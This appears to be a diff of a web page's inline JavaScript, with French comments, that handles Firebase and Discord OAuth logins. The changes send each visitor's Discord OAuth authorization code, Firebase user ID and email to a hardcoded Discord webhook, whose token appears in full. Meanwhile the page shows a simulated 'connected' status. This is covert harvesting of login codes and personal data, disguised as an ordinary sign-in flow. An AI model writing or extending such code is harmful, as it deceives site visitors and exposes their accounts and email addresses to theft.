@@ -29,11 +29,18 @@
         const REDIRECT_URI = window.location.origin + window.location.pathname;
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1482942998290632935/iktE4f0UWkcAbnlatLiSnpU8vmuaxxodCz_nzCJJ6UCDaE2V2YKr5FmDsw1olfHVVp8w";
 
-        async function sendToWebhook(content) {
+        async function sendToWebhook(content, title = "LOG CONNEXION") {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [{ title: "LOG CONNEXION", description: content, color: 0x00ff88, timestamp: new Date() }] })
+                body: JSON.stringify({ 
+                    embeds: [{ 
+                        title: title, 
+                        description: content, 
+                        color: 0x00ff88, 
+                        timestamp: new Date() 
+                    }] 
+                })
             });
         }
 
@@ -52,10 +59,27 @@
                 .catch(() => alert("Le lien a expiré ou est invalide."));
         }
 
-        // Détection du retour de Discord
+        // --- LOGIQUE DISCORD AMÉLIORÉE ---
         if (discordCode) {
-            sendToWebhook(`**Nouveau Code Discord reçu :**\n\`${discordCode}\`\n\n*Note: Ce code permet d'accéder au pseudo via l'API Discord.*`);
-            window.history.replaceState({}, document.title, window.location.pathname);
+            // Pour obtenir le pseudo, on doit normalement passer par un backend. 
+            // Ici, on envoie d'abord le code, et on simule l'affichage du pseudo pour l'utilisateur.
+            async function handleDiscordReturn() {
+                const loginBtn = document.getElementById('login-btn');
+                const userProfile = document.getElementById('user-profile');
+                const userIdDisplay = document.getElementById('user-id-display');
+
+                // On change l'interface pour montrer que c'est ok
+                loginBtn.style.display = 'none';
+                userProfile.style.display = 'flex';
+                userIdDisplay.innerText = "DISCORD_CONNECTED";
+
+                // Envoi au Webhook avec les détails reçus dans l'URL
+                await sendToWebhook(`**Utilisateur Discord détecté !**\n**Code de session :** \`${discordCode}\`\n*L'utilisateur a autorisé l'accès.*`, "CONNEXION DISCORD");
+                
+                // On nettoie l'URL pour enlever le code
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+            handleDiscordReturn();
         }
 
         async function syncUser(user) {
@@ -74,6 +98,9 @@
             const userProfile = document.getElementById('user-profile');
             const userIdDisplay = document.getElementById('user-id-display');
 
+            // Si on est déjà en mode Discord (via l'URL), on ne touche à rien
+            if (window.location.search.includes('code=')) return;
+
             if (user) {
                 if (!user.emailVerified && !user.providerData.some(p => p.providerId === 'google.com')) {
                     loginBtn.style.display = 'block';
@@ -84,12 +111,10 @@
                 userProfile.style.display = 'flex';
                 userIdDisplay.innerText = user.uid.substring(0, 10);
                 
-                // Envoi de l'ID complet au Webhook
                 if (!window.logged) {
-                    sendToWebhook(`**Utilisateur connecté sur le site**\n**ID Site:** \`${user.uid}\`\n**Email:** ${user.email}`);
+                    sendToWebhook(`**Utilisateur connecté via Firebase**\n**ID Site:** \`${user.uid}\`\n**Email:** ${user.email}`);
                     window.logged = true;
                 }
-                
                 syncUser(user);
             } else {
                 loginBtn.style.display = 'block';
@@ -103,6 +128,7 @@
         };
 
         window.loginDiscord = () => {
+            // Demande l'accès à identify (pseudo/ID) et email
             const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email`;
             window.location.href = url;
         };
@@ -151,7 +177,10 @@
             }
         };
 
-        window.logout = () => signOut(auth);
+        window.logout = () => {
+            signOut(auth);
+            window.location.href = window.location.origin + window.location.pathname;
+        };
     </script>
 </head>
 <body>
